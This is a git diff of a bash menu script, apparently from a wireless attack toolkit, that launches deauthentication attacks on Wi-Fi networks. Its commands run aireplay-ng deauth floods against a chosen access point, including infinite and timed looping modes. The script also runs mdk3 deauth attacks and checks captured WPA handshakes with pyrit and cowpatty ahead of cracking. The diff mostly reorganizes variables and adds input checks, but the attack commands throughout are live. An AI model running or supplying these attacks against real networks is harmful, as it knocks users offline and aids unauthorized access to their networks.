@@ -1,19 +1,6 @@
 #! /bin/bash
+
 #############DEFAULTS###############
-#setting yellow-start 
-YS="\e[1;33m"
-#setting color-end
-CE="\e[0m"
-#setting red-start
-RS="\e[1;31m"
-#setting frequent stings
-YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
-YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
-YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
-PAKT="Press "$YS"any key$CE to"
-PAKTC="Press "$YS"any key$CE to continue..."
-PAKTGB="Press "$YS"any key$CE to go back..."
-LPATH="/root/lscript"
 DPID=$$
 echo -e "$DPID" > "$LPATH"/dpid.txt
 ####################################
@@ -27,6 +14,56 @@ printf '\033]2;DEAUTH MENU\a'
 REDEAUTH="n"
 WLANNM=$(cat /root/lscript/wlanmon.txt)
 export WLANNM
+function defaults_lh2
+{
+#path for lscript
+	LPATH="/root/lscript"
+	export LPATH
+#yellow start 
+	YS="\e[1;33m"
+#blue start 
+	BS="\e[0;34m"
+#color end
+	CE="\e[0m"
+#red start
+	RS="\e[1;31m"
+#black start
+	BLS="\e[0;30m"
+#dark gray start
+	DGYS="\e[1;30m"
+#light blue start
+	LBS="\e[1;34m"
+#green start
+	GNS="\e[0;32m"
+#light green start
+	LGNS="\e[1;32m"
+#cyan start
+	CYS="\e[0;36m"
+#light cyan start
+	LCYS="\e[1;36m"
+#light red start
+	DRS="\e[0;31m"
+#purple start
+	PS="\e[0;35m"
+#light purple start
+	LPS="\e[1;35m"
+#brown start
+	BRS="\e[0;33m"
+#light gray start
+	LGYS="\e[0;37m"
+#white start
+	WHS="\e[1;37m"
+#setting frequent stings
+	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
+	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
+	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
+	PAKT="Press "$YS"any key$CE to"
+	PAKTC="Press "$YS"any key$CE to continue..."
+	PAKTGB="Press "$YS"any key$CE to go back..."
+	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
+#code to read from keyboard without return
+	READAK="read -n 1"
+}
 function option3
 {
 while true
@@ -150,10 +187,10 @@ function pyrit_hand_check
 			else
 				echo -e "Handshake found!(Status: "$RS"bad"$CE")"
 			fi
-			sleep 3
+			sleep 2
 		else
 			echo -e "Valid handshake found!(Status: "$YS"good"$CE")"
-			sleep 3
+			sleep 2
 		fi
 	else
 		VALIDH=0
@@ -179,6 +216,7 @@ function cowpatty_hand_check
 		sleep 2
 	fi
 }
+defaults_lh2
 if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
 then
 	read IGN < ""$LPATH"/settings/ignorenegativeone.txt"
@@ -207,30 +245,47 @@ do
 	then
 		echo -e ""$YS"ENTER"$CE") Last option"
 	fi
-	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e ""$YS" 0"$CE") Exit"
 	read DT
 	if [[ "$DT" = 1 ]]
 	then
+		PER=0
 		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
 		read -e DEAUTHS
 		if [[ -z "$DEAUTHS" ]]
 		then
 			DEAUTHS=0
 		fi
-		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM"
+		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit"
 		export DEAUTHS
 		export TARGB
-		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash'
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
 	elif [[ "$DT" == 4 ]]
 	then
 		echo -e "Number of deauths per time: "
 		read DPT
+		if [[ ! "$DPT" -gt 0 ]]
+		then
+			echo -e ""$RS"Invalid number"$CE""
+			sleep 2
+			LASTOPTIONS=""
+			continue
+		fi
 		echo -e "Delay in seconds: "
 		read DIS
+		if [[ ! "$DIS" -gt 0 ]]
+		then
+			echo -e ""$RS"Invalid number"$CE""
+			sleep 2
+			LASTOPTIONS=""
+			continue
+		fi
 		export DIS
 		export DPT
 		clear
-		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit"
+		PER=1
+		LASTOPTIONS="4"
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
 	elif [[ "$DT" == 5 ]]
 	then
 		if [[ "$HANDF" != "deauth" ]]
@@ -265,19 +320,22 @@ do
 				if [[ "$LASTOPTIONS" = 1 ]]
 				then
 					option3
+				elif [[ "$LASTOPTIONS" = 4 ]]
+				then
+					xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
 				else
-					xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash"
+					xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
 				fi
 			fi
 		fi
-	sleep 2
+		sleep 2
 	elif [[ "$DT" = 2 ]]
 	then
 		echo "$TARGB" > /root/mdk3bssid.txt
 		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
 		export DEAUTHS
 		export TARGB
-		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
+		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
 	elif [[ "$DT" = 3 ]]
 	then
 		LASTOPTIONS=1
